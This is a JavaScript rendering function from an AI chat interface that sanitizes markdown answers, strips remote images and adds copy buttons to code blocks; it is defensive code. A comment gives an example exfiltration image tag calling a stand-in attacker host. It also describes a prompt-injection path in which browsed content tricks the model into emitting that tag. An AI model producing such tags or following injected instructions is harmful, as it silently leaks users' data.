/* ---------- Markdown rendering with code copy buttons ---------- */
function renderMarkdown(md, opts){
  const skipHighlight = !!(opts && opts.skipHighlight) || !codeHighlightOn;
  const raw = marked.parse(md||'');
  const clean = DOMPurify.sanitize(raw, {ADD_ATTR:['target']});
  const wrap = document.createElement('div');
  wrap.innerHTML = clean;
  // Security: jawaban AI bisa memuat teks dari sumber tak tepercaya (hasil
  // Naze Auto Browse). Sebuah <img src="https://attacker.tld/log?d=...">
  // yang lolos sanitasi akan otomatis di-fetch browser saat dirender —
  // jadi jalur eksfiltrasi diam-diam kalau model "tertipu" instruksi di
  // dalam konten yang dibrowsing. Hanya izinkan gambar data: URI (mis. hasil
  // generate image); gambar remote dibuang.
  wrap.querySelectorAll('img').forEach(img=>{
    const src = img.getAttribute('src') || '';
    if(!src.startsWith('data:')) img.remove();
  });
  wrap.querySelectorAll('pre code').forEach(codeEl=>{
    const pre = codeEl.parentElement;
    let lang = (codeEl.className.match(/language-(\w+)/)||[])[1] || '';
    const codeText = codeEl.textContent;
    const head = document.createElement('div');
    head.className='code-head';
    head.innerHTML = `<span>${lang?escapeHtml(lang):'code'}</span><button class="copy-btn" type="button">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>`;
    head.querySelector('button').addEventListener('click', (e)=>{
      navigator.clipboard.writeText(codeText).then(()=>{
        const b=e.currentTarget; const old=b.innerHTML; b.innerHTML='<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg> Disalin';
        setTimeout(()=>b.innerHTML=old, 1400);
      });
    });
    pre.parentNode.insertBefore(head, pre);
    // Perf: while a message is still streaming in, skip the (relatively
    // expensive) syntax highlighter on every single re-render and just show
    // plain code text — it gets highlighted once the message is complete via
    // the skipHighlight:false final render / hlAll(). Avoids re-highlighting
    // the same growing code block dozens of times per second mid-stream.
    if(!skipHighlight){
      try{ hljs.highlightElement(codeEl); }catch(e){}
    }
  });
  wrap.querySelectorAll('a').forEach(a=>{ a.setAttribute('target','_blank'); a.setAttribute('rel','noopener noreferrer'); });
  return wrap;
}
function hlAll(){ if(!codeHighlightOn) return; $$('#thread pre code').forEach(c=>{ try{hljs.highlightElement(c);}catch(e){} }); }

